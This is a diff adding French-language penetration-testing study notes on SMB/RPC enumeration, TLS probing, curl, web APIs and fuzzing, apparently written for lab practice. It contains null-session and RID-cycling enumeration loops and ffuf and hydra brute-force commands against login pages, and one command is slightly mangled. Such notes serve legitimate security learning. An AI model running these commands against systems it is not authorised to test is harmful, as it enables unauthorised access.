+`nc` enverrait des octets en clair → le serveur coupe. `openssl s_client` fait le tunnel → on passe. C'est souvent le **seul moyen** de dialoguer avec un service qui exige le chiffré.
+
+**En résumé**
+
+| Objectif | Ce que ça donne |
+| --- | --- |
+| Énumération | Noms d'hôtes/domaines internes, org, e-mails via le certificat |
+| Finding rapport | Crypto faible, certificat expiré/auto-signé |
+| Accès | Dialoguer/s'authentifier sur un service qui exige TLS |
+| Confirmation | Le FTPS est actif (`AUTH TLS` accepté) |
+
+### L'avantage vs les autres outils
+
+Les outils classiques pour dialoguer avec un service brut (`nc`, `telnet`) envoient tout **en clair** : dès qu'un service exige du chiffré, ils sont inutilisables. `openssl s_client`, c'est **le « netcat qui parle TLS »**.
+
+| Outil | Parle TLS ? | STARTTLS ? | Montre le certificat ? |
+| --- | --- | --- | --- |
+| `nc` / `telnet` | ❌ clair seulement | ❌ | ❌ |
+| client `ftp` | ❌ (ou FTPS caché) | partiel | ❌ |
+| **`openssl s_client`** | ✅ | ✅ (`-starttls`) | ✅ |
+
+Les 3 avantages concrets :
+
+1. **Il ouvre le tunnel que `nc` ne sait pas faire** — un service qui impose TLS coupe `nc` ; OpenSSL monte le chiffrement puis te laisse la main → tu accèdes à ce qui était inaccessible.
+2. **Il fait le STARTTLS tout seul** — négocier `AUTH TLS` et basculer la socket en TLS au bon moment est quasi impossible à la main ; `-starttls ftp` automatise cette bascule.
+3. **Il te donne le certificat « gratuitement »** — aucun autre outil d'interaction brute ne sort le `Subject`/`SAN`/`Issuer` → de l'énumération que `nc` ne t'aurait jamais donnée.
+
+> En une phrase : `openssl s_client` permet d'interagir manuellement avec un service chiffré (impossible avec `nc`/`telnet`) **tout en récupérant le certificat** → à la fois **un accès** et **de l'énumération**, en une seule commande.
+
+****
+
+## rpcclient
+
+
+<mark>🔴le protocole SMB dans nmap s'appel:</mark>
+ <mark>🔴netbios-ssn (ancien)</mark>
+ <mark>🔴microsoft-ds(moderne)</mark>
+ 
+```
+cat /etc/samba/smb.conf | grep -v "#\|\;"
+```
+config de base de samba(smb)
+`rpcclient` (paquet `samba-common-bin`) est un client **MS-RPC** : il parle le protocole d'appel de procédures distantes de Windows/Samba, exposé via **SMB sur le port 445** (et le service `MSRPC` sur le 135). Il permet d'interroger à distance un contrôleur de domaine ou une machine Windows/Samba pour **énumérer utilisateurs, groupes, partages, politique de mots de passe**, etc.
+
+### Connexion
+
+```bash
+# session anonyme / null session (sans identifiants)
+rpcclient -U "" -N 10.129.32.128
+
+# avec identifiants
+rpcclient -U 'utilisateur%motdepasse' 10.129.32.128
+```
+
+| Option | Rôle |
+| --- | --- |
+| `-U "utilisateur%motdepasse"` | login (user vide `""` = session anonyme) |
+| `-N` | pas de mot de passe (null session) |
+| `10.129.32.128` | IP de la cible |
+
+Une fois connecté, on obtient un prompt `rpcclient $>` où on tape des **commandes d'énumération**.
+
+### Commandes utiles (énumération)
+
+| Commande | Ce qu'elle fait |
+| --- | --- |
+| `srvinfo` | infos serveur (OS, version, *server type*) |
+| `enumdomains` | liste les **domaines** connus de la machine (ex. `DEVSMB` + `Builtin`) |
+| `enumdomusers` | **liste tous les utilisateurs** du domaine (+ leur RID) |
+| `enumdomgroups` | liste les groupes |
+| `querydominfo` | infos sur le domaine (nom, nb users, **rôle** : PDC...) |
+| `queryuser 0x<RID>` | détails d'un utilisateur (dernier login, flags, description...) |
+| `getdompwinfo` | **politique de mot de passe** (longueur mini, complexité) |
+| `netshareenum` / `netshareenumall` | liste les partages SMB (+ chemin disque) |
+| `netsharegetinfo <share>` | **détail d'un partage + sa DACL** (permissions d'accès) |
+| `lsaenumsid` | liste les SID connus |
+| `lookupnames <user>` | résout un nom → SID |
+| `lookupsids <SID>` | résout un SID → nom |
+
+### Lire la DACL d'un partage puis y accéder
+
+```bash
+# dans rpcclient : détailler les permissions d'un partage
+netsharegetinfo notes
+# → dans la DACL : SID S-1-1-0 (Everyone) + 0x101f01ff (Generic all access) = lecture+écriture pour tous
+
+# accéder au partage (session anonyme)
+smbclient //<IP>/notes -N
+# dans smbclient : ls / get <fichier> / put <fichier>
+```
+
+> SID à connaître : `S-1-1-0` = *Everyone*, `S-1-5-7` = *Anonymous*, `S-1-5-32-544` = *Administrators*, `S-1-5-18` = *SYSTEM*.
+
+### Comprendre une DACL
+
+Une **DACL** (*Discretionary Access Control List*) est la **liste des permissions** attachée à un objet Windows/Samba (partage, fichier, clé de registre...). Elle répond à la question : **« qui a le droit de faire quoi ? »**
+
+Structure :
+- Un objet possède un **descripteur de sécurité**, qui contient la **DACL**.
+- La DACL est une liste d'**ACE** (*Access Control Entry*). Chaque ACE = **une règle** pour un SID.
+- Un **ACE** contient 3 infos :
+  1. **Type** : `ACCESS ALLOWED` (autorise) ou `ACCESS DENIED` (interdit).
+  2. **SID** : à qui s'applique la règle (un user, un groupe, ou un SID connu comme `S-1-1-0` = Everyone).
+  3. **Masque de permissions** : ce qui est autorisé/interdit (lecture, écriture, delete...).
+
+Règles de lecture :
+- **Pas de DACL** = pas de protection → accès total à tout le monde.
+- **DACL vide** (0 ACE) = personne n'a accès.
+- Les **ACE `DENIED` sont prioritaires** sur les `ALLOWED`.
+
+Décodage d'un masque de permissions (ex. `0x101f01ff`) :
+
+| Valeur / mot-clé | Droit |
+| --- | --- |
+| `Generic all access` / `0x101f01ff` | **contrôle total** (lecture + écriture + exécution + modif des droits) |
+| `READ_CONTROL_ACCESS` | lire la sécurité de l'objet |
+| `WRITE_DAC_ACCESS` | **modifier la DACL** (= se donner tous les droits) |
+| `WRITE_OWNER_ACCESS` | devenir **propriétaire** de l'objet |
+| `DELETE_ACCESS` | supprimer l'objet |
+| `0x1ff` (*Specific bits*) | tous les droits spécifiques au type d'objet (read/write/append...) |
+
+➡️ **En pentest** : une ACE `ACCESS ALLOWED` pour `S-1-1-0` (**Everyone**) avec `Generic all access` sur un partage = **n'importe qui (même anonyme) lit et écrit** → mauvaise config exploitable (dépôt de payload, lecture de secrets, remplacement d'un fichier traité par un service).
+
+### Intérêt en pentest
+
+- 🎯 **Énumération d'utilisateurs** via `enumdomusers` → on construit une **liste de logins** pour du password spraying / brute force (`crackmapexec`, `kerbrute`).
+- 🔓 **Null session** : si la machine accepte `-U "" -N`, on énumère **sans aucun identifiant** → mauvaise config classique = finding.
+- 🔑 **RID cycling** : même sans `enumdomusers`, on devine les utilisateurs en bouclant sur les RID (`queryuser 0x3e8`, `0x3e9`...).
+- 📋 **Politique de mot de passe** (`getdompwinfo`) → savoir combien de tentatives avant lockout avant de bruteforcer.
+- Souvent l'**étape suivante après un `nmap`** qui révèle les ports **135 (MSRPC)** / **139-445 (SMB)**.
+
+> Astuce : pour une énumération automatique qui enchaîne toutes ces requêtes, `enum4linux-ng -A 10.129.32.128` fait le travail de dizaines de commandes `rpcclient` d'un coup.
+
+```shell
+for i in $(seq 500 1100);do rpcclient -N -U "" <ip cible> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
+```
+
+l'alternative à ce script sera d'utiliser l'outil samrdump.py d'Impacket.
+
+```shell
+samrdump.py <ip cible> 
+```
+
+les outils SMBMap et CrackMapExec sont connus aussi pour faire de l'énumération des services SMB
+
+```shell
+smbmap -H <ip cible>
+```
+
+```
+crackmapexec <protocole> <IP> --shares -u '' -p ''
+```
+
+<mark>🔴crackmapexec a été remplacer par  netexec sur exegol </mark>
+
+```
+rpcclient $> netsharegetinfo <partage>
+```
+
+donne le chemin complet du partage
+
+## NFS
+</script>
+<script type="text/plain" class="note-src" data-id="web" data-title="Web — HTTP, Curl &amp; API" data-cat="web" data-desc="Curl, codes de statut, API REST / SOAP / GraphQL, fuzzing d&#x27;API." data-tags="Curl,REST,GraphQL,Fuzzing" data-cmds="18">
+# Curl - Notes
+
+## GET (méthode par défaut)
+
+L'option GET est par défaut sur `curl`, elle permet de demander des infos à une URL comme ça :
+
+```bash
+curl http://<IP>:<PORT>/
+```
+
+## Options utiles
+
+- `-i` : permet de voir l'en-tête
+- `-u <Login>:<MDP>` : permet d'envoyer le login/MDP et de récupérer la page si on a besoin de se connecter
+- `-v` : passe curl en mode verbose, ce qui donne pas mal d'infos en plus
+- `-H` : permet d'ajouter un header ou entête HTTP, il peut être utilisé si on a la ligne `Authorization:`, il remplacera `-u <LOGIN>:<MDP>`
+
+## POST
+
+POST permet à l'appli web d'envoyer des données au serveur pour créer ou modifier une ressource. Par exemple, une page de login l'utilise quand on rentre des credentials.
+
+Pour passer des credentials avec POST, la commande serait :
+
+```bash
+curl -X POST -d 'username=<LOGIN>&password=<MDP>' http://<IP>:<PORT>
+```
+
+Si `-i` ou `-v` est ajouté, on peut voir le `Set-Cookie` qui est le cookie de connexion.
+
+### Utiliser le cookie de session
+
+Pour l'utiliser il faudra utiliser `-b` comme ça :
+
+```bash
+curl -b 'PHPSESSID=' http://<IP>:<PORT>
+```
+
+Il est possible de le mettre en header avec :
+
+```bash
+curl -H 'Cookie: PHPSESSID=' http://<IP>:<PORT>
+```
+
+Ou aller directement dans la page d'inspection, dans la rubrique **Storage**.
+
+### Requête POST en JSON
+
+Dans la section réseau (Network), on peut voir la requête en JSON qui est envoyée avec le POST du site, et avec la commande :
+
+```bash
+curl -X POST -d '{JSON code}' -b 'PHPSESSID' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php
+```
+
+Cela reviendra au même que sur le site.
+
+Dans curl l'option -d permet de passer des données dans la requête
+
+## API CRUD
+
+Il existe des API CRUD qui permettent de modifier des lignes, supprimer et créer des lignes.
+
+CRUD :
+
+<img loading="lazy" class="note-img" src="assets/img-20260605120429.png" style="max-width:100%%" alt="Schéma de note">
+
+`curl` sans options permet de lire la ligne.
+Avec `| jq` ça permet d'afficher en format JSON.
+
+### Créer
+
+```bash
+curl -X POST <URL> -d '{"city_name":"Londre","country_name":"HTB"}' -H 'Content-Type: application/json'
+```
+
+(cette ligne est un exemple pour créer une ligne pour un pays)
+
+### Mettre à jour
+
+```bash
+curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
+```
+
+(cette ligne permet de mettre à jour une ligne, exemple)
+
+### Supprimer
+
+```bash
+curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City
+```
+
+(permet de supprimer une ligne, exemple)
+
+### Lire une ligne
+
+```bash
+curl -s http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City | jq
+```
+
+(permet de lire la ligne, exemple)
+
+## Autres options curl
+
+Dans curl la commande `-IL` signifie :
+- `-I` récupère juste le header
+- `-L` suit les redirections
+
+Dans curl l'option :
+- `-s` : rend curl silencieux, c'est-à-dire supprime la barre de progression et les messages d'erreur
+- `-c <fichier.txt>` : permet de save le cookie dans un fichier
+- `-b <fichier.txt>` : envoie le cookie depuis le fichier
+
+## Brute-force
+
+Pour faire du brute-force, le mieux si on n'a pas Burp Suite Pro est **ffuf** ou **hydra**.
+
+```bash
+ffuf -w /usr/share/wordlists/rockyou.txt -X POST \ -d "username=admin&password=FUZZ" \ -H "Content-Type: application/x-www-form-urlencoded" \ -u [http://10.10.10.50/login.php](http://10.10.10.50/login.php) \ -fr "Admin Information Systems Login"
+```
+
+
+la commande:
+
+```bash
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -f <ip cible> http-post-form "/login.php:username=^USER^&password=^PASS^::S=Logout" -V
+```
+
+permet de brute force sur une page de login
+
+-v = verbose
+-F = arrte quand un match es trouver
+
+
+## Codes de statut HTTP
+
+Le serveur répond toujours avec un **code de statut** (visible avec `curl -i`, `-I` ou `-v`). En énumération, ce code est une mine d'infos : il dit si une ressource existe, si elle est protégée, si elle redirige, etc. C'est sur ces codes que s'appuient les outils de fuzzing (`ffuf`, `gobuster`) pour filtrer les résultats.
+
+### 1xx — Information (réponse provisoire)
+
+Rarement vu directement, le serveur traite encore la requête.
+
+| Code | Nom | Signification |
+|------|-----|---------------|
+| 100 | Continue | Le serveur a reçu l'en-tête, le client peut envoyer le corps de la requête |
+| 101 | Switching Protocols | Changement de protocole (ex. passage en **WebSocket**) |
+
+### 2xx — Succès
+
+La requête a réussi. **La ressource existe et est accessible.**
+
+| Code | Nom | Signification / intérêt offensif |
+|------|-----|---------------|
+| 200 | OK | Succès classique → la page/ressource existe |
+| 201 | Created | Ressource créée (réponse typique d'un `POST`/`PUT` sur une API CRUD) |
+| 204 | No Content | Succès mais pas de corps renvoyé (fréquent après un `DELETE`) |
+| 206 | Partial Content | Réponse partielle (requête avec en-tête `Range:`) |
+
+### 3xx — Redirection
+
+La ressource existe mais se trouve ailleurs. **Un `301`/`302` sur un répertoire pendant un fuzzing = la ressource existe**, suivre la redirection avec `-L`.
+
+| Code | Nom | Signification / intérêt offensif |
+|------|-----|---------------|
+| 301 | Moved Permanently | Redirection permanente (souvent http→https, ou `/dir` → `/dir/`) |
+| 302 | Found | Redirection temporaire (souvent après un login réussi ou échoué) |
+| 303 | See Other | Redirige vers une autre ressource en `GET` |
+| 304 | Not Modified | Ressource inchangée (cache) |
+| 307 / 308 | Temporary / Permanent Redirect | Comme 302/301 mais conserve la méthode HTTP (POST reste POST) |
+
+### 4xx — Erreur côté client
+
+La requête est fautive ou refusée. **Ce sont les codes clés en énumération.**
+
+| Code | Nom | Signification / intérêt offensif |
+|------|-----|---------------|
+| 400 | Bad Request | Requête malformée (payload cassé, mauvais `Content-Type`) |
+| 401 | Unauthorized | Authentification **requise** → cible à brute-forcer (`-u`, header `Authorization:`) |
+| 403 | Forbidden | Ressource **existe mais accès interdit** → piste de contournement (403 bypass : `/admin` vs `/admin/`, en-têtes `X-Forwarded-For`, verbe HTTP…) |
+| 404 | Not Found | Ressource inexistante → c'est le code à **filtrer** en fuzzing (`-fc 404`) |
+| 405 | Method Not Allowed | La méthode (ex. `POST`) n'est pas permise → tester d'autres verbes |
+| 408 | Request Timeout | Le serveur a trop attendu |
+| 413 | Payload Too Large | Corps de requête trop gros |
+| 414 | URI Too Long | URL trop longue |
+| 418 | I'm a teapot | Blague RFC, parfois utilisé comme réponse « piège » |
+| 429 | Too Many Requests | **Rate limiting** → ralentir le brute-force (`--scan-delay`, threads `-t` plus bas) |
+
+### 5xx — Erreur côté serveur
+
+Le serveur plante en traitant la requête. **Très intéressant** : une erreur `500` provoquée par un payload = signe que l'entrée n'est pas filtrée (piste injection SQL, SSTI, LFI…).
+
+| Code | Nom | Signification / intérêt offensif |
+|------|-----|---------------|
+| 500 | Internal Server Error | Erreur serveur → souvent déclenchée par une injection → **à creuser** |
+| 501 | Not Implemented | Méthode non supportée par le serveur |
+| 502 | Bad Gateway | Reverse proxy reçoit une mauvaise réponse du backend |
+| 503 | Service Unavailable | Serveur surchargé / en maintenance |
+| 504 | Gateway Timeout | Le backend n'a pas répondu à temps au proxy |
+
+### Mémo rapide pour le fuzzing (feroxbuster)
+
+```bash
+# Scan de base (feroxbuster filtre le bruit 404/wildcard tout seul, et récursif par défaut)
+feroxbuster -u http://<IP>/ -w wordlist.txt
+
+# Masquer en plus des codes précis (ex. 403, 404)
+feroxbuster -u http://<IP>/ -w wordlist.txt -C 404 403
+
+# N'afficher qu'une classe de codes voulue (ex. 200 301 302)
+feroxbuster -u http://<IP>/ -w wordlist.txt -s 200 301 302
+```
+
+- `-C` = **filter-status** (masque ces codes)
+- `-s` = **status-codes** (n'affiche que ces codes)
+- `-x php,txt,html` : tester des extensions · `-d <n>` : profondeur de récursion · `-t` : threads
+
+Règle de lecture : **2xx** = ça existe et c'est ouvert · **3xx** = ça existe, ça redirige · **401/403** = ça existe mais c'est protégé (pistes d'attaque) · **404** = rien · **5xx** = le serveur casse (possible injection).
+
+## API Web
+
+l'API Web es un ensemble de regle et de spécialisation qui permettent a differente appli logiciel de communication sur le Web.
+
+Cela fonctionne comme un language universel permettant a divers composant logiciels de d'echanger des datas et des services de maniere transparente.
+
+l'API Web sert de pont entre un serveur et le client qui voudrai utiliser ou acceder a ses données
+
+## API REST
+
+Les API REST constituent un style architectural populaire pour la création de services Web.
+
+elle utilisent un modele de communication client-serveur sans état où les clients,envoient des requetes aux serveur pour accéder à des ressources ou les manipuler
+
+Les API REST utilisent les Méthodes HTTP (GET,POST,PUT,DELETE) pour faire des opération CRUD ( Create,READ,Update,DELETE) sur des ressources identifiées par l'URL unique.
+
+exemple de requêtes 
+```
+GET /users/123
+```
+
+### Points de terminaison (endpoints)
+
+Les API REST sont construites autour du concept de **ressources**, identifiées par des URL uniques appelées **points de terminaison**. Ces endpoints sont les cibles des requêtes clients et incluent souvent des paramètres pour fournir un contexte ou un contrôle supplémentaire sur l'opération demandée.
+
+Ils sont structurés comme des URL représentant la ressource à consulter/manipuler, suivant un **modèle hiérarchique** (les ressources spécifiques sont imbriquées sous des catégories plus larges) :
+
+- `/users` — une collection de ressources utilisateur
+- `/users/123` — un utilisateur spécifique (ID 123)
+- `/products` — une collection de ressources produit
+- `/products/456` — un produit spécifique (ID 456)
+
+### Types de paramètres
+
+Les paramètres modifient le comportement des requêtes ou fournissent des infos supplémentaires. Dans les API REST :
+
+| Type de paramètre | Description | Exemple |
+|---|---|---|
+| **Paramètres de requête** (query) | Ajoutés à l'URL après un `?`. Utilisés pour le filtrage, le tri ou la pagination. | `/users?limit=10&sort=name` |
+| **Paramètres de chemin** (path) | Intégrés directement dans l'URL. Utilisés pour identifier une ressource spécifique. | `/products/{id}` |
+| **Paramètres du corps** (body) | Envoyés dans le corps des requêtes `POST`, `PUT` ou `PATCH`. Utilisés pour créer/mettre à jour une ressource. | `{ "name": "New Product", "price": 99.99 }` |
+
+### Découverte des endpoints et paramètres REST
+
+- **Documentation de l'API** : la source la plus fiable. Elle liste souvent les endpoints, leurs paramètres, les formats requête/réponse et des exemples. Chercher des specs comme **Swagger (OpenAPI)** ou **RAML** (descriptions lisibles par machine).
+- **Analyse du trafic réseau** : si la doc manque ou est incomplète, intercepter et inspecter les échanges avec **Burp Suite** ou les outils de dev du navigateur pour révéler endpoints, paramètres et formats de données.
+- **Fuzzing de noms de paramètres** : comme le fuzzing de répertoires/fichiers, avec **ffuf** ou **wfuzz** + wordlists adaptées, pour découvrir des paramètres cachés ou non documentés.
+
+## API SOAP
+
+Les API SOAP suivent un protocole plus formel et standardisé pour l'échange d'info structurées.
+
+elles utilise XML pour définir des messages qui sont ensuite encapsulé dans des enveloppes SOAP et transmis via des protocoles réseau comme HTTP ou SMTP.
+
+Les API SOPA incluent souvent des fonctionnalités intégrées de sécurité,de fiabilité et de gestion des transactions,ce qui les rend adaptées au appli d'entreprise nécessitant une intégrité des données et une gestion des erreurs strictes:
+
+exemples:
+
+```xml
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <tem:GetStockPrice>
+         <tem:StockName>AAPL</tem:StockName>
+      </tem:GetStockPrice>
+   </soapenv:Body>
+</soapenv:Envelope>
+
+```
+
+### Endpoints et paramètres SOAP
+
+Les API SOAP (Simple Object Access Protocol) s'appuient sur des messages **XML** et des fichiers **WSDL** (Web Services Description Language) pour définir leurs interfaces et opérations.
+
+Contrairement à REST (une URL par ressource), une API SOAP expose généralement **un seul point de terminaison** : une URL où le serveur écoute les requêtes. C'est le **contenu du message SOAP** qui détermine l'opération à effectuer.
+
+Les paramètres sont définis dans le **corps** du message SOAP (document XML), organisés en éléments et attributs hiérarchiques. Leur structure dépend de l'opération invoquée et est décrite dans le **WSDL**.
+
+Exemple : une API de bibliothèque avec une opération `SearchBooks` et les paramètres d'entrée :
+- `keywords` (string) — les termes de recherche
+- `author` (string) — nom de l'auteur (facultatif)
+- `genre` (string) — genre du livre (facultatif)
+
+```xml
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:lib="http://example.com/library">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <lib:SearchBooks>
+         <lib:keywords>cybersecurity</lib:keywords>
+         <lib:author>Dan Kaminsky</lib:author>
+      </lib:SearchBooks>
+   </soapenv:Body>
+</soapenv:Envelope>
+```
+
+Ici `keywords` = « cybersecurity », `author` = « Dan Kaminsky », `genre` est omis (pas de filtrage par genre). La réponse contiendrait la liste des livres correspondants, formatée selon le WSDL.
+
+### Découverte des endpoints et paramètres SOAP
+
+- **Analyse du WSDL** : la ressource la plus précieuse. Il décrit les opérations (endpoints), les paramètres d'entrée/sortie, les types de données et l'URL du point de terminaison. Analysable manuellement ou avec des outils dédiés.
+- **Analyse du trafic réseau** : intercepter le trafic SOAP avec **Wireshark** ou **tcpdump** pour examiner la structure des messages et en extraire endpoints/paramètres.
+- **Fuzzing de noms et valeurs de paramètres** : envoyer des valeurs malformées/inattendues dans les requêtes SOAP pour découvrir des opérations/paramètres cachés et observer les réponses du serveur.
+
+## GraphQL
+
+`GraphQL` est un langage de requête et un environnement d'exécution (runtime) relativement nouveaux pour les `API`. Contrairement aux `API REST`, qui exposent plusieurs points de terminaison (endpoints) pour différentes ressources, `GraphQL` fournit un point de terminaison unique où les clients peuvent demander les données dont ils ont besoin en utilisant un langage de requête flexible. Cela élimine le problème du sur-rapatriement (over-fetching) ou du sous-rapatriement (under-fetching) de données, qui est courant dans les `API REST`. Les capacités de typage fort et d'introspection de `GraphQL` facilitent l'évolution des `API` dans le temps sans casser les clients existants, ce qui en fait un choix populaire pour les applications web et mobiles modernes.
+
+```graphql
+query {
+  user(id: 123) {
+    name
+    email
+  }
+}
+```
+
+### Endpoints et paramètres GraphQL
+
+Les API GraphQL sont plus flexibles et efficaces que REST/SOAP : le client demande **précisément** les données voulues en une seule requête.
+
+Contrairement à REST/SOAP (plusieurs endpoints), une API GraphQL expose généralement **un seul point de terminaison** (souvent `/graphql`), point d'entrée de toutes les **requêtes (queries)** et **mutations**. C'est le langage de requête qui définit les paramètres et structure les données demandées.
+
+### Requêtes (queries) — lire des données
+
+Les requêtes récupèrent des données en ciblant les champs, relations et objets imbriqués exacts → élimine l'over-fetching et l'under-fetching. Les arguments permettent le filtrage, le tri, la pagination.
+
+| Composant | Description | Exemple |
+|---|---|---|
+| **Champ** | Une donnée précise à récupérer. | `name`, `email` |
+| **Relation** | Une connexion entre types de données (ex. les publications d'un utilisateur). | `posts` |
+| **Objet imbriqué** | Un champ qui renvoie un autre objet (parcours en profondeur du graphe). | `posts { title, body }` |
+| **Argument** | Modifie le comportement d'une requête/champ. | `posts(limit: 5)` |
+
+```graphql
+query {
+  user(id: 123) {
+    name
+    email
+    posts(limit: 5) {
+      title
+      body
+    }
+  }
+}
+```
+
+→ Infos du `user` ID 123 : son `name`, son `email`, et ses 5 premières `posts` (avec `title` et `body`).
+
+### Mutations — modifier des données
+
+Les mutations créent, mettent à jour ou suppriment des données. Comme les queries, elles acceptent des arguments.
+
+| Composant | Description | Exemple |
+|---|---|---|
+| **Opération** | L'action à effectuer. | `createPost`, `updateUser`, `deleteComment` |
+| **Argument** | Données d'entrée requises. | `title: "New Post", body: "..."` |
+| **Sélection** | Champs à récupérer dans la réponse après la mutation. | `id`, `title` |
+
+```graphql
+mutation {
+  createPost(title: "New Post", body: "This is the content of the new post") {
+    id
+    title
+  }
+}
+```
+
+→ Crée une publication avec le titre/corps donnés et renvoie l'`id` et le `title` de la publication créée.
+
+### Découverte des queries et mutations
+
+- **Introspection** : en envoyant une requête d'introspection au endpoint GraphQL, on récupère le **schéma complet** (types, champs, queries, mutations, arguments). Exploité par les outils/IDE pour l'auto-complétion, la validation et la doc.
+- **Documentation de l'API** : les API bien documentées fournissent guides et références. Des outils comme **GraphiQL** ou **GraphQL Playground** (souvent intégrés au serveur) offrent un environnement interactif pour explorer le schéma et tester les requêtes.
+- **Analyse du trafic réseau** : capturer et inspecter les requêtes/réponses vers l'endpoint `graphql` pour observer des queries/mutations réelles et cibler le fuzzing.
+
+> GraphQL privilégie la flexibilité : il n'y a pas forcément un ensemble rigide de queries/mutations. Se concentrer sur le **schéma sous-jacent** et la façon dont un client construit des requêtes valides.
+
+## ## En quoi les API sont-elles différentes d'un serveur web
+
+| Caractéristique | Serveur Web | API |
+|---|---|---|
+| **Objectif** | Servir du contenu statique (HTML, CSS, images) et des pages web dynamiques générées côté serveur. | Permettre à différentes applications de communiquer entre elles, d'échanger des données et de déclencher des actions. |
+| **Communication** | Dialogue avec les navigateurs via HTTP (Hypertext Transfer Protocol). | Peut utiliser divers protocoles : HTTP, HTTPS, SOAP, etc., selon l'API. |
+| **Format de données** | Principalement HTML, CSS, JavaScript et autres formats liés au web. | Divers formats : JSON, XML, etc., selon les spécifications de l'API. |
+| **Interaction utilisateur** | L'utilisateur interagit directement via un navigateur pour afficher pages et contenu. | L'utilisateur n'interagit pas directement ; ce sont les applications qui utilisent l'API en son nom. |
+| **Accès** | Généralement accessible publiquement sur Internet. | Publique, privée (usage interne) ou partenaire (clients/partenaires spécifiques). |
+| **Exemple** | En visitant `https://www.example.com`, on interagit avec un serveur web qui renvoie le HTML/CSS/JS affiché par le navigateur. | Une appli météo utilise une API météo pour récupérer les données depuis un serveur distant, puis les affiche. L'API travaille en arrière-plan. |
+
+## Fuzzing d'API
+
+le fuzzing d'API es une forme de fuzzing adapté au API Web,Le principe reste le meme, mais fuzzing d'API se concentre sur la structure et les protocoles unique utilisé par les API web 
+
+le fuzzing d'API consiste à bombader une API avec une série de test automatisé,chque teste envoie une requetes légérement modifier à un point de terminaison d'API.
+
+Les modifs peuvent être :
+
+- La modification des valeurs des paramètres
+- La modification des en-têtes de requête
+- Le changement de l'ordre des paramètres
+- L'introduction de types ou de formats de données inattendus
+
+Le fuzzing d'API es crucial pour plusieurs raison comme :
+
+- `Découvrir des vulnérabilités cachées` : Les API ont souvent des points de terminaison et des paramètres cachés ou non documentés qui peuvent être vulnérables aux attaques. Le fuzzing aide à découvrir ces surfaces d'attaque cachées.
+- `Tester la robustesse` : Le fuzzing évalue la capacité de l'API à gérer correctement les entrées inattendues ou malformées, en s'assurant qu'elle ne plante pas et n'expose pas de données sensibles.
+- `Automatiser les tests de sécurité` : Tester manuellement toutes les combinaisons d'entrées possibles est irréalisable. Le fuzzing automatise ce processus, ce qui permet d'économiser du temps et des efforts.
+- `Simuler des attaques du monde réel` : Le fuzzing peut imiter les actions d'acteurs malveillants, vous permettant d'identifier les vulnérabilités avant que les attaquants ne les exploitent.
+
+## Types de fuzzing d'API
+
+Il existe 3 principaux types de fuzzing d'API
+
+1. `Fuzzing de paramètres` - L'une des techniques principales du fuzzing d'API, le fuzzing de paramètres se concentre sur le test systématique de différentes valeurs pour les paramètres de l'API. Cela inclut les paramètres de requête (ajoutés à l'URL du point de terminaison de l'API), les en-têtes (contenant des métadonnées sur la requête) et les corps de requête (transportant la charge utile des données). En injectant des valeurs inattendues ou invalides dans ces paramètres, les fuzzers peuvent exposer des vulnérabilités telles que les attaques par injection (par ex., injection SQL (SQL injection), injection de commande), le cross-site scripting (XSS) et la falsification de paramètres (parameter tampering).
+2. `Fuzzing de format de données` - Les API web échangent fréquemment des données dans des formats structurés comme JSON ou XML. Le fuzzing de format de données cible spécifiquement ces formats en manipulant la structure, le contenu ou l'encodage des données. Cela peut révéler des vulnérabilités liées à des erreurs d'analyse (parsing), des dépassements de tampon (buffer overflows) ou une mauvaise gestion des caractères spéciaux.
+3. `Fuzzing de séquence` - Les API impliquent souvent plusieurs points de terminaison interconnectés, où l'ordre et le moment des requêtes sont cruciaux. Le fuzzing de séquence examine comment une API répond à des séquences de requêtes, découvrant des vulnérabilités comme les conditions de concurrence (race conditions), les références directes à un objet non sécurisées (IDOR) ou les contournements d'autorisation. En manipulant l'ordre, le moment ou les paramètres des appels d'API, les fuzzers peuvent exposer des faiblesses dans la logique et la gestion d'état de l'API.
+
+
+## Exploration de l'API
+
+Bien que la spécification Swagger détaille explicitement cinq points de terminaison, il est crucial de reconnaître que les API peuvent contenir des points de terminaison non documentés ou « cachés » qui sont intentionnellement omis de la documentation publique.
+
+Ces points de terminaison cachés peuvent exister pour des fonctions internes non destinées à un usage externe, comme une tentative malavisée de sécurité par l'obscurité, ou parce qu'ils sont encore en cours de développement et pas encore prêts pour une consommation publique.
+</script>
+<script type="text/plain" class="note-src" data-id="sqli" data-title="Injection SQL" data-cat="web" data-desc="Bases de données, langage SQL et logique d&#x27;injection." data-tags="SQLi,MySQL,NoSQL" data-cmds="33">
+de nombreux types de vulns d'injection sont possible dans une appli web comme l'injection HTTP , l'injection de code , injection de commande mais la plus courante es l'injection SQL
+
+L'attaque Injection SQL es le fait d'ecrire du code SQL.
+
+Dans le cas le plus simple on peut injecté des " ou '
+
+Une fois qu'un attaquant peut injecter, il doit chercher un moyen d'exécuter une requête SQL différente. Cela peut être fait en utilisant du code SQL pour composer une requête fonctionnelle qui exécute à la fois la requête prévue et les nouvelles requêtes SQL. Il existe de nombreuses façons d'y parvenir, comme l'utilisation de requêtes [empilées](https://www.sqlinjection.net/stacked-queries/) ou de requêtes [Union](https://www.mysqltutorial.org/sql-union-mysql.aspx/). Enfin, pour récupérer la sortie de notre nouvelle requête, nous devons l'interpréter ou la capturer sur le front-end de l'application web.
+
+Cette attaque peut etre critique car l'attanquant pourrai récuperer des infos sensibles comme MDP,user ou d'autre infos 
+
